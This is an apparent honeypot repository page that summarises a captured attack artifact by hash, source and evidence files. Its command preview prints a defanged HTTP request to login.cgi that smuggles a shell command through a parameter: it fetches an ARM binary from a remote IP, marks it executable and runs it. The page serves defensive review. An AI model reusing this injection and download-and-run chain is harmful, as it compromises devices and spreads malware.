# 5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /login.cgi?cli=aa%20aa%27;wget%20hxxp://85[.]11[.]167[.]XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%2
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
